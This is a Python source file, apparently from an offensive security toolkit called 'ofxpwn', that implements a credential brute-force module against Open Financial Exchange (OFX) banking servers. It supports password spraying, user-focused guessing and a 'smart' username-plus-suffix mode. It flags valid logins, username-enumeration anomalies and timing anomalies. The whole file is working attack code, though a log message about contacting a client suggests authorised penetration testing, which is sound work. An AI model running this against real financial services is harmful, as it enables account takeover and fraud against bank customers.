"""
Credential Brute Force Module

Performs systematic credential brute-forcing using wordlists.
"""

from typing import Dict, Any, List, Tuple
import time
import itertools
from pathlib import Path

from ofxpwn.core.base_module import BaseModule
from ofxpwn.core.config import Config
from ofxpwn.core.logger import Logger
from ofxpwn.core.protocol import OFXRequest
from ofxpwn.core.sender import OFXSender


class BruteforceModule(BaseModule):
    """Credential brute-forcing with wordlists"""

    @classmethod
    def get_description(cls) -> str:
        return "Brute-force credentials using wordlists"

    def _load_wordlist(self, filepath: str) -> List[str]:
        """Load wordlist from file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            self.logger.error(f"Wordlist not found: {filepath}")
            return []
        except Exception as e:
            self.logger.error(f"Error loading wordlist: {e}")
            return []

    def run(self, config: Config, logger: Logger) -> Dict[str, Any]:
        """Run credential brute-forcing"""
        self.config = config
        self.logger = logger

        logger.info("="*60)
        logger.info("Credential Brute Force Attack")
        logger.info("="*60)

        ofx = OFXRequest(
            org=config.get_target_org(),
            fid=config.get_target_fid()
        )
        sender = OFXSender(config, logger)

        results = {
            'attempts': 0,
            'valid_credentials': [],
            'interesting_responses': [],
            'errors': []
        }

        # Load wordlists
        base_dir = Path(__file__).parent.parent.parent / 'payloads'

        username_file = config.get('bruteforce.username_file', str(base_dir / 'usernames.txt'))
        password_file = config.get('bruteforce.password_file', str(base_dir / 'passwords.txt'))

        logger.info(f"\nLoading wordlists...")
        logger.info(f"  Usernames: {username_file}")
        logger.info(f"  Passwords: {password_file}")

        usernames = self._load_wordlist(username_file)
        passwords = self._load_wordlist(password_file)

        if not usernames or not passwords:
            logger.error("Failed to load wordlists")
            return results

        logger.info(f"\nLoaded {len(usernames)} usernames and {len(passwords)} passwords")

        # Get attack mode
        mode = config.get('bruteforce.mode', 'default')
        max_attempts = config.get('bruteforce.max_attempts', 1000)
        delay = config.get('bruteforce.delay', 0.5)

        combinations = []

        if mode == 'username_spray':
            # Try each password against all usernames
            logger.info("Mode: Password spraying (one password against all users)")
            for password in passwords:
                for username in usernames:
                    combinations.append((username, password))
                    if len(combinations) >= max_attempts:
                        break
                if len(combinations) >= max_attempts:
                    break

        elif mode == 'user_focused':
            # Try all passwords for each username
            logger.info("Mode: User-focused (all passwords per user)")
            for username in usernames:
                for password in passwords:
                    combinations.append((username, password))
                    if len(combinations) >= max_attempts:
                        break
                if len(combinations) >= max_attempts:
                    break

        else:  # default
            # Try common combinations first, then cartesian product
            logger.info("Mode: Default (smart combinations)")

            # Same username:password
            for username in usernames:
                if username in passwords:
                    combinations.append((username, username))

            # Common patterns
            for username in usernames:
                for suffix in ['', '1', '123', '!', '2024', '2025']:
                    pwd = username + suffix
                    if pwd in passwords:
                        combinations.append((username, pwd))

            # Remaining cartesian product
            for username, password in itertools.product(usernames, passwords):
                if (username, password) not in combinations:
                    combinations.append((username, password))
                    if len(combinations) >= max_attempts:
                        break
                if len(combinations) >= max_attempts:
                    break

        total_combinations = min(len(combinations), max_attempts)
        logger.info(f"\nTesting {total_combinations} combinations...")
        logger.info(f"Delay between attempts: {delay}s")
        logger.warning("This may take some time...")
        logger.info("-" * 60)

        # Track baseline response for anomaly detection
        baseline_status = None
        baseline_size = None

        for idx, (username, password) in enumerate(combinations[:max_attempts], 1):
            if idx % 50 == 0:
                logger.info(f"Progress: {idx}/{total_combinations} attempts...")

            logger.debug(f"Trying: {username}:{password}")

            request_body = ofx.build_sgml_header() + "<OFX>\n"
            request_body += ofx.build_signon_sgml(username, password)
            request_body += "</OFX>\n"

            start_time = time.time()
            result = sender.send_request(
                request_body,
                save_name=f"bruteforce_{idx}"
            )
            elapsed = time.time() - start_time

            results['attempts'] += 1

            if not result.get('success'):
                error = result.get('error', 'unknown')
                results['errors'].append({
                    'username': username,
                    'password': password,
                    'error': error
                })

                # Check for account lockout indicators
                if 'timeout' in error.lower() or 'blocked' in error.lower():
                    logger.warning(f"\nPossible account lockout or rate limiting detected!")
                    logger.warning(f"Consider reducing rate or stopping attack")

                    self.log_finding(
                        'MEDIUM',
                        'Possible Account Lockout',
                        f'Attack may have triggered rate limiting or account lockout',
                        'Credentials may be locked. Consider slower attack or contact client.'
                    )

                time.sleep(delay)
                continue

            http_status = result.get('http_status')
            ofx_status = result.get('ofx_status')
            response_size = len(result.get('response_text', ''))

            # Set baseline on first successful response
            if baseline_status is None:
                baseline_status = ofx_status
                baseline_size = response_size

            # Check for successful authentication
            if ofx_status == 0:
                logger.finding(
                    'CRITICAL',
                    'Valid Credentials Found',
                    f'Successfully authenticated: {username}:{password}',
                    f'OFX Status: {ofx_status}'
                )
                logger.success(f"\n*** VALID CREDENTIALS: {username}:{password} ***\n")

                results['valid_credentials'].append({
                    'username': username,
                    'password': password,
                    'ofx_status': ofx_status,
                    'http_status': http_status
                })

            # Check for anomalies that might indicate valid username
            elif ofx_status != baseline_status or abs(response_size - baseline_size) > 100:
                logger.info(f"  Interesting response: {username}:{password} "
                           f"[OFX:{ofx_status}, Size:{response_size}]")

                results['interesting_responses'].append({
                    'username': username,
                    'password': password,
                    'ofx_status': ofx_status,
                    'http_status': http_status,
                    'size': response_size,
                    'elapsed': elapsed
                })

            # Check for timing anomalies
            if elapsed > delay * 3:
                logger.info(f"  Timing anomaly: {username}:{password} ({elapsed:.2f}s)")
                results['interesting_responses'].append({
                    'username': username,
                    'password': password,
                    'timing_anomaly': elapsed
                })

            time.sleep(delay)

        # Summary
        logger.info("\n" + "="*60)
        logger.info("Brute Force Summary")
        logger.info("="*60)
        logger.info(f"Total attempts: {results['attempts']}")
        logger.info(f"Valid credentials found: {len(results['valid_credentials'])}")
        logger.info(f"Interesting responses: {len(results['interesting_responses'])}")
        logger.info(f"Errors encountered: {len(results['errors'])}")

        if results['valid_credentials']:
            logger.success("\nVALID CREDENTIALS DISCOVERED:")
            for cred in results['valid_credentials']:
                logger.success(f"  {cred['username']}:{cred['password']}")
        else:
            logger.warning("No valid credentials found in tested combinations")

        if results['interesting_responses']:
            logger.info("\nInteresting responses detected (possible username enumeration):")
            for resp in results['interesting_responses'][:5]:
                logger.info(f"  {resp['username']}:{resp.get('password', 'N/A')}")

        stats = sender.get_stats()
        logger.info(f"\nTotal requests sent: {stats['requests_sent']}")

        return results
